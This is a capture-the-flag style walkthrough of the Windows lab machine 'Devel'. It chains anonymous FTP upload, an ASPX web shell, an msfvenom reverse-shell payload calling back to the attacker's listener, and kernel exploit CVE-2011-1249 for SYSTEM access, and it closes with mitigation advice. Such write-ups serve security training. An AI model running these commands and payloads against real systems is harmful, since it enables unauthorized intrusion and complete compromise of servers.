---
layout: single
classes: wide
title: 'Devel Machine Walkthrough'
date: '2024-05-29T11:33:22.318Z'
keywords: []
tags: 
  - Security miscofiguration
  - Uncontrolled-file-upload
  - Missing-security-patches
categories:
  - Web applications
toc: true
toc_label: "Table of Contents"
sidebar:
  nav: "sidebar"
permalink: /Devel/
---

## Machine Summary

Devel is a relatively straightforward machine running the Microsoft Windows OS that shows how weak authentication to file servers, uncontrolled file uploads and missing security patches, combined, can lead to the complete compromise of a web application.  As a result the file transfer protocol (FTP) server allowing ANONYMOUS access, I was able to login to the FTP server without credentials.  As a result of the IIS web server not restricting what file types can be uploaded to it, I was able to upload and execute a malicious ASPX file containing a reverse shell payload on the victim machine to gain a foothold as a low privileged, non-administrative user. As a result of missing security patches, a kernel vulnerability that leads to privilege escalation was exploited to give me root user as **NT Authority\\System.**

In the last section, I've included a summary of all the vulnerabilities found on this machine and security controls to mitigate exploitation.

![Devel machine exploitation matrix](/Pen-testing-blog/assets/images/1__E89__CXQXg__HC3aRCjl7LDw.png "Figure 1 -Devel machine exploitation matrix")

## Step 1 — Enumeration

As a first step, I try to gather as much as information as I can about the target machine such as open ports, running services, OS and version etc. For this I use **Nmap** tool with below syntax. Brief explanation of flags:

* \-sV — Detect services running at IP address and their versions
* \-sC — Run the default set of Nmap scripts to gather more information
* \-T4 — Speed up the performance of the scan

```bash
Nmap \-sV \-sC \-T4
```

![Nmap scan output](/Pen-testing-blog/assets/images/1__m3sksBlneos6fysIWbUorw.png "Figure 2 - Nmap scan output")

The information from the Nmap scan is very interesting and suggests some initial attack vector we can use to exploit. In addition to ANONYMOUS login being enabled on the FTP server, the files **iisstart.htm** and **welcome.png** are actually the files hosted at the web server root!

At this point, I usually like to further enumerate with tools like GoBuster using a good word list to search for hidden directories that could contain sensitive data such as **/Admin**. However, as the web root directory appears to be accessible via FTP, I will focus my attack in this direction.

## Step 2 — Gaining foothold as low privileged web application user

As the web root directory can be accessed via the FTP server, I upload a simple ASPX web shell to test both if the FTP grants write privileges, and if so, whether remote command execution (RCE) is possible.

### Testing for RCE on web server

I locate the default web shell for ASPX in Kali Linux and copy it to my local user desktop, and then upload it to the web root via FTP **PUT** command. As Anonymous FTP login is enabled, user ID is just **Anonymous** with **blank password**.

```bash
ftp 10.10.10.5
```

![ASPX webshell uploaded to victim machine](/Pen-testing-blog/assets/images/1__JliQL2Ow8NopIyKGywvS6Q.png "Figure 3 - ASPX webshell uploaded to victim machine")

I then access to the web shell via the browser at [http://10.10.10.5/cmdasp.aspx](http://10.10.10.5/cmdasp.aspx). I test RCE by issuing the **Whoami** command. The command is successful, returning the login ID of the currently logged in user, **iis apppool\\web,** confirming we have RCE.

![Successful remote code execution on victim machine](/Pen-testing-blog/assets/images/1__v9blxScERuGHExhmIzFcXA.png "Figure 4 - Successfule remote code execution on victim machine")

### Obtaining a reverse shell to victim machine as low-level privileged user

The next step after validating RCE is to obtain a reverse shell. There are several ways to obtain a reverse shell, but here I will create a custom payload encoded in the ASPX format using **msfvenom** (component of MetaSploit framework — Read more [**here**](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html).) I will upload this payload to web server via FTP put command as shown above. Explanation of flags and parameters:

* \-p — payload selection (simple reverse shell over TCP chosen)
* LHOST — The local IP of my Kali instance as the attacking machine
* LPORT — The local port for victim to connect (can be any open port)
* \-f — payload encoding (choose ASPX to match web server language)
* \-o — Output file name

```bash
msfvenom -p windows/shell\_reverse\_tcp LHOST 10.10.10.30 LPORT 4444 -f aspx -o reverseshell.aspx
```

Next, I will set up a Net Cat listener on my machine in listen mode to catch the reverse shell once the malicious ASPX page is accessed on the web server. Explanation of flags and input parameters:

* \-l — Put Net Cat into listening mode
* \-v — Enable verbose output (use -vv for more verbosity)
* \-n — Do not resolve DNS
* \-p — Port to listen on (choose 4444 to match payload from msvenom)

```bash
nc -lvnp 4444
```

![NetCat listener set up on my machine to catch reverse shell connection from victim machine](/Pen-testing-blog/assets/images/1__DIk9__HtBCf__KjWeqB1XvYA.png "Figure 6 - NetCat listener set up on my Kali Linux machine to catch reverse shell connection from victim computer")

Upon issuing a cURL command to the victim’s IP address in the Kali console, Net Cat will catch the reverse shell and we gain access to the victim’s machine as the low privileged user, **iis apppool\\web**

```bash
curl <http://10.10.10.5/reverseshell.aspx>
```

![Successful reverse shell connection established on victim machine](/Pen-testing-blog/assets/images/1__W3y3yPv__7__NE57UXB__GTwQ.png "Figure 7 - Successful reverse shell connection established on victim computer")

## Step 3 — Privilege escalation to root user as NT Authority\\System

### Enumerating Victim Computer for Vulnerabilities to escalate privileges

The next step after gaining an initial foothold is to escalate our privileges to the ROOT user as **NT Authority\\System**. The first step I do is run the **systeminfo** command which will output detailed information about the victim’s machine such as the OS build version, patches applied etc. The output of systeminfo below shows the OS version to be **6.1.7600 N/A Build 7600** and more importantly, **no hotfix patches have been applied**!

![Systeminfo command output showing missing security patches on victim's machine](/Pen-testing-blog/assets/images/1__Nx__Evi4GZDYU73bax42cXw.png "Figure 8 - Systeminfo command output showing missing security patches")

A simple Google search for “**privesc 6.1.7600 N/A Build 7600**” reveals the victim’s machine is vulnerable to **CVE-2011–1249** caused by the Windows ancillary function driver (Afd driver) running in elevated kernel mode improperly validating input passed to it from non — elevated user mode. CVE-2011–1249 already exists within the OffSec exploit database so the raw exploit code can be accessed using the **searchsploit** command in Kali Linux and copied to working directory with the -m flag.

![CVE-2011-1249 vulnerability details](/Pen-testing-blog/assets/images/1__63BdYjOulxxU92__oqL2hXg.png "Figure 9 - CVE-2011-1249 vulnerability details")

### Compiling vulnerability exploit code into an executable program

I run the one-line code to compile the exploit executable in the same directory on my Kali Linux machine where I downloaded the raw exploit. 40564.C is the raw exploit code from searchsploit -m 40564.c command.

![Compiled vulnerability executable](/Pen-testing-blog/assets/images/1__hcp__TtfkzlQCHzhd9xweHA.png "Figure 10 - Compiled vulnerability exploit into executable program")

### Executing exploit on victim machine to escalate access privileges to ROOT user

The final step is to transfer the malicious payload from my Kali Linux machine to the victim’s machine and execute it there, for which I will use the **Impacket smbserver.py** script from the Impacket scripts bundle. I create a directory that will be shared with the victim (share) and copy the exploit executable to this directory. Upon the victim (Devel) successfully authenticating to my malicious SMB share, the exploit executes, giving me root as **NT authority\\system.**

![Successful incoming connection to SMB file share by victim computer](/Pen-testing-blog/assets/images/1__Z54iWr4b0zMGwf5jTQmzDw.png "Figure 11 - Successful catching of reverse shell connection from victim computer to my Kali Linux machine")

![Successful CVE-2011-1249 exploitaition leading to ROOT user privileges](/Pen-testing-blog/assets/images/1__iGGcd78yopUMBy8yb3KFNw.png "Figure 12 - Successful elevation of privilges to ROOT user via exploitation of CVE-2011-1249 vulnerability")

## Vulnerabilities - Exploitation and mitigation summary

The machine demonstrated the following vulnerabilities and how they can be exploited. I've also included some security controls that can mitigate exploitation:

### **Uncontrolled file upload**

Vulnerability allows a malicious user to upload dangerous file types such as executables directly to a web server. In this example, as a result of the web server not validating the file extensions and content of files uploaded, I was able to upload a malicious ASPX file containing a reverse shell payload allowing me to gain unauthorized access on the web server for initial foothold.

Security best practices and controls that can block and / or mitigate the effects of this vulnerability include the following:

* Remove EXECUTE permissions from the upload destination directory on web server or uploading the files to a location outside the web root.
* Strictly limit the file length and size of uploaded files.
* Use a combination of methods such as file MIME type validation and file content validation to detect dangerous file types. Do not rely on the file extension or CONTENT-Type header as these values are easily spoofed.

### **Security misconfiguration**

Misconfigured or insecurely configured web server settings allows malicious actors to take malicious actions. As a result of ANONYMOUS login with WRITE access being enabled on the FTP server, I was able to abuse this function to upload a malicious reverse shell payload despite not being not authenticated to the FTP server

Security best practices and controls that can block and / or mitigate the effects of this vulnerability include the following:

* Disable ANONYMOUS access to FTP servers as unauthenticated users should not be permitted to read or write to file shares.

### **Missing security patches**

As a result of missing security patches, I was able to use a publicly released vulnerability exploit to escalate my access to root user upon gaining initial foothold on machine.

Security best practices and controls that can block and / or mitigate the effects of this vulnerability include the following:

* Always keep systems updated with the latest security patches.
* If business constraints do not allow vulnerable systems to be patched, compensating security controls such as limiting vulnerable systems access to the Internet, should be implemented to reduce the attack surface and vectors. The risk vs benefit calculation for whether the patching decision should be deferred should be guided by a security risk analysis.
